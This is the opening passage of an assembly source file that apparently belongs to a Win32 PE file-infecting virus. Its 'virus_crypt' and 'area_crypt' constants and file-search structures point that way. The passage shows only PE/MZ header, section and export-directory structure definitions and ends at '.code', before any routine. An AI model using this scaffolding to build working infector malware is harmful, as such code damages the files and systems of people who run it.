           extrn MessageBoxA:proc
           extrn ExitProcess:proc

           one_minute equ 60000
           virus_crypt equ (file_data - area_crypt)/4
           ofs equ offset

   .data
   dummy       db virus_crypt dup (00h)

   filetime                STRUC
   FT_dwLowDateTime        dd ?
   FT_dwHighDateTime       dd ?
   filetime                ENDS
   win32_find_data         STRUC
   FileAttributes          dd ?
   CreationTime            filetime ?
   LastAccessTime          filetime ?
   LastWriteTime           filetime ?
   FileSizeHigh            dd ?
   FileSizeLow             dd ?
   Reserved0               dd ?
   Reserved1_              dd ?
   FileName                db 260 dup (?)
   AlternateFileName       db 14 dup (?)
   win32_find_data         ENDS

   peheader_find_data      STRUC
   _pe                     dd 00h
   _cpu                    dw 00h
   _objects                dw 00h
                           dd 3 dup (00h)
   _nt                     dw 00h
                           dw 00h
                           dd 4 dup (00h)
   _entry                  dd 00h
                           dd 2 dup (00h)
   _image_base             dd 00h
   _obj_ln                 dd 00h
   _file_ln                dd 00h
                           dd 4 dup (00h)
   _img_sz                 dd 00h
   _header_sz              dd 00h
                           db 168 dup (00h)
   peheader_find_data      ENDS

   section_pe_file         STRUC
   _name_sec               db 8 DUP (00h)
   _virtual_sz             dd 00h            ; SH_VirtualSize
   _RVA                    dd 00h            ; SH_VirtualAddress
   _physical_sz            dd 00h            ; SH_SizeOfRawData
   _physical_off           dd 00h            ; SH_PointerToRawData
                           dd 3 dup (00h)
   _obj_flags              db 4 dup (00h)
   section_pe_file         ENDS

   IMAGE_DOS_HEADER STRUC           ; DOS .EXE header
   MZ_magic         DW ?            ; Magic number
   MZ_cblp          DW ?            ; Bytes on last page of file
   MZ_cp            DW ?            ; Pages in file
   MZ_crlc          DW ?            ; Relocations
   MZ_cparhdr       DW ?            ; Size of header in paragraphs
   MZ_minalloc      DW ?            ; Minimum extra paragraphs needed
   MZ_maxalloc      DW ?            ; Maximum extra paragraphs needed
   MZ_ss            DW ?            ; Initial (relative) SS value
   MZ_sp            DW ?            ; Initial SP value
   MZ_csum          DW ?            ; Checksum
   MZ_ip            DW ?            ; Initial IP value
   MZ_cs            DW ?            ; Initial (relative) CS value
   MZ_lfarlc        DW ?            ; File address of relocation table
   MZ_ovno          DW ?            ; Overlay number
   MZ_res           DW 4 DUP(?)     ; Reserved words
   MZ_oemid         DW ?            ; OEM identifier (for MZ_oeminfo)
   MZ_oeminfo       DW ?            ; OEM information; MZ_oemid specific
   MZ_res2          DW 10 DUP(?)    ; Reserved words
   MZ_lfanew        DD ?            ; File address of new exe header
   IMAGE_DOS_HEADER ENDS            ;
   IMAGE_DOS_HEADER_SIZE = SIZE IMAGE_DOS_HEADER
                                    ;
   IMAGE_FILE_HEADER STRUC          ; Portable Exe File
   PE_Magic                 DD ?    ;
   Machine                  DW ?    ; Machine type
   NumberOfSections         DW ?    ; Number of sections
   TimeDateStamp            DD ?    ; Date and Time
   PointerToSymbolTable     DD ?    ; Pointer to Symbols
   NumberOfSymbols          DD ?    ; Number of Symbols
   SizeOfOptionalHeader     DW ?    ; Size of Optional Header
   Characteristics          DW ?    ; File characteristics
   IMAGE_FILE_HEADER ENDS           ;
   IMAGE_FILE_HEADER_SIZE = SIZE IMAGE_FILE_HEADER
                                    ;
   IMAGE_DATA_DIRECTORY STRUC       ; Image data directory
   DD_VirtualAddress    DD ?        ; Virtual address
   DD_Size              DD ?        ; Virtual size
   IMAGE_DATA_DIRECTORY ENDS        ;;;;;;;;;
                                            ;
   IMAGE_DIRECTORY_ENTRIES STRUC            ; All directories
   DE_Export       IMAGE_DATA_DIRECTORY  ?  ;
   DE_Import       IMAGE_DATA_DIRECTORY  ?  ;
   DE_Resource     IMAGE_DATA_DIRECTORY  ?  ;
   DE_Exception    IMAGE_DATA_DIRECTORY  ?  ;
   DE_Security     IMAGE_DATA_DIRECTORY  ?  ;
   DE_BaseReloc    IMAGE_DATA_DIRECTORY  ?  ;
   DE_Debug        IMAGE_DATA_DIRECTORY  ?  ;
   DE_Copyright    IMAGE_DATA_DIRECTORY  ?  ;
   DE_GlobalPtr    IMAGE_DATA_DIRECTORY  ?  ;
   DE_TLS          IMAGE_DATA_DIRECTORY  ?  ;
   DE_LoadConfig   IMAGE_DATA_DIRECTORY  ?  ;
   DE_BoundImport  IMAGE_DATA_DIRECTORY  ?  ;
   DE_IAT          IMAGE_DATA_DIRECTORY  ?  ;
   IMAGE_DIRECTORY_ENTRIES ENDS             ;
   IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16    ;
                                            ;;;;;;;;;;;
   IMAGE_OPTIONAL_HEADER STRUC                        ; Optional Header
   OH_Magic                        DW ?           ; Magic word
   OH_MajorLinkerVersion           DB ?           ; Major Linker version
   OH_MinorLinkerVersion           DB ?           ; Minor Linker version
   OH_SizeOfCode                   DD ?           ; Size of code section
   OH_SizeOfInitializedData        DD ?           ; Initialized Data
   OH_SizeOfUninitializedData      DD ?           ; Uninitialized Data
   OH_AddressOfEntryPoint          DD BYTE PTR ?  ; Initial EIP
   OH_BaseOfCode                   DD BYTE PTR ?  ; Code Virtual Address
   OH_BaseOfData                   DD BYTE PTR ?  ; Data Virtual Address
   OH_ImageBase                    DD BYTE PTR ?  ; Base of image
   OH_SectionAlignment             DD ?           ; Section Alignment
   OH_FileAlignment                DD ?           ; File Alignment
   OH_MajorOperatingSystemVersion  DW ?           ; Major OS
   OH_MinorOperatingSystemVersion  DW ?           ; Minor OS
   OH_MajorImageVersion            DW ?           ; Major Image version
   OH_MinorImageVersion            DW ?           ; Minor Image version
   OH_MajorSubsystemVersion        DW ?           ; Major Subsys version
   OH_MinorSubsystemVersion        DW ?           ; Minor Subsys version
   OH_Win32VersionValue            DD ?           ; win32 version
   OH_SizeOfImage                  DD ?           ; Size of image
   OH_SizeOfHeaders                DD ?           ; Size of Header
   OH_CheckSum                     DD ?           ; unused
   OH_Subsystem                    DW ?           ; Subsystem
   OH_DllCharacteristics           DW ?           ; DLL characteristic
   OH_SizeOfStackReserve           DD ?           ; Stack reserve
   OH_SizeOfStackCommit            DD ?           ; Stack commit
   OH_SizeOfHeapReserve            DD ?           ; Heap reserve
   OH_SizeOfHeapCommit             DD ?           ; Heap commit
   OH_LoaderFlags                  DD ?           ; Loader flags
   OH_NumberOfRvaAndSizes          DD ?           ; Number of directories
                                   UNION          ; directory entries
   OH_DataDirectory                IMAGE_DATA_DIRECTORY\
                                   IMAGE_NUMBEROF_DIRECTORY_ENTRIES DUP (?)
   OH_DirectoryEntries             IMAGE_DIRECTORY_ENTRIES ?
                                   ENDS           ;
   IMAGE_OPTIONAL_HEADER ENDS                     ;
   IMAGE_OPTIONAL_HEADER_SIZE = SIZE IMAGE_OPTIONAL_HEADER
                                                  ;
   IMAGE_SECTION_HEADER STRUC                     ; Section hdr.
   SH_Name                 DB 8 DUP(?)            ; name
                           UNION                  ;
   SH_PhysicalAddress      DD BYTE PTR ?          ; Physical address
   SH_VirtualSize          DD ?                   ; Virtual size
                           ENDS                   ;
   SH_VirtualAddress       DD BYTE PTR ?          ; Virtual address
   SH_SizeOfRawData        DD ?                   ; Raw data size
   SH_PointerToRawData     DD BYTE PTR ?          ; pointer to raw data
   SH_PointerToRelocations DD BYTE PTR ?          ; ...
   SH_PointerToLinenumbers DD BYTE PTR ?          ; ...... not really used
   SH_NumberOfRelocations  DW ?                   ; ....
   SH_NumberOfLinenumbers  DW ?                   ; ..
   SH_Characteristics      DD ?                   ; flags
   IMAGE_SECTION_HEADER ENDS                      ;
   IMAGE_SECTION_HEADER_SIZE = SIZE IMAGE_SECTION_HEADER
                                               ;
   ;IMAGE_IMPORT_BY_NAME STRUC                  ; Import by name data type
   ;IBN_Hint DW 0                               ; Hint entry
   ;IBN_Name DB 1 DUP (?)                       ; name
   ;IMAGE_IMPORT_BY_NAME ENDS                   ;
   ;                                            ;
   ;IMAGE_THUNK_DATA STRUC                      ; Thunk data
   ;                    UNION                   ;
   ;TD_AddressOfData    DD IMAGE_IMPORT_BY_NAME PTR ? ; Ptr to IMAGE_IMPORT_BY_NAME structure
   ;TD_Ordinal          DD ?                    ; Ordinal ORed with IMAGE_ORDINAL_FLAG
   ;TD_Function         DD BYTE PTR ?           ; Ptr to function (i.e. Function address after program load)
   ;TD_ForwarderString  DD BYTE PTR ?           ; Ptr to a forwarded API function.
   ;                    ENDS                    ;
   ;IMAGE_THUNK_DATA ENDS               ;;;;;;;;;
   ;                                    ;
   ;IMAGE_IMPORT_DESCRIPTOR STRUC       ; Import descryptor
   ;                      UNION         ;
   ;ID_Characteristics    DD ?          ; 0 for last null import descriptor
   ;ID_OriginalFirstThunk DD IMAGE_THUNK_DATA PTR ? ; RVA to original unbound IAT
   ;                      ENDS          ;
   ;ID_TimeDateStamp      DD ?          ;
   ;ID_ForwarderChain     DD ?          ; -1 if no forwarders
   ;ID_Name               DD BYTE PTR ? ; RVA to name of imported DLL
   ;ID_FirstThunk         DD IMAGE_THUNK_DATA PTR ?  ; RVA to IAT
   ;IMAGE_IMPORT_DESCRIPTOR ENDS        ;
   ;IMAGE_IMPORT_DESCRIPTOR_SIZE = SIZE IMAGE_IMPORT_DESCRIPTOR
   ;
   IMAGE_EXPORT_DIRECTORY STRUC                ; Export Directory type
   ED_Characteristics        DD ?              ; Flags
   ED_TimeDateStamp          DD ?              ; Date / Time
   ED_MajorVersion           DW ?              ; Major version
   ED_MinorVersion           DW ?              ; Minor version
   ED_Name                   DD    BYTE PTR ?  ; Ptr to name of exported DLL
                             UNION             ;
   ED_Base                   DD    ?           ; base
   ED_BaseOrdinal            DD    ?           ; base ordinal
                             ENDS              ;
   ED_NumberOfFunctions      DD    ?           ; number of exported funcs.
                             UNION             ;
   ED_NumberOfNames          DD    ?           ; number of exported names
   ED_NumberOfOrdinals       DD    ?           ; number of exported ordinals
                             ENDS              ;
   ED_AddressOfFunctions     DD    DWORD PTR ? ; Ptr to array of function addresses
   ED_AddressOfNames         DD    DWORD PTR ? ; Ptr to array of (function) name addresses
                             UNION             ;
   ED_AddressOfNameOrdinals  DD    WORD PTR ?  ; Ptr to array of name ordinals
   ED_AddressOfOrdinals      DD    WORD PTR ?  ; Ptr to array of ordinals
                             ENDS              ;
   IMAGE_EXPORT_DIRECTORY ENDS                 ;

   .code
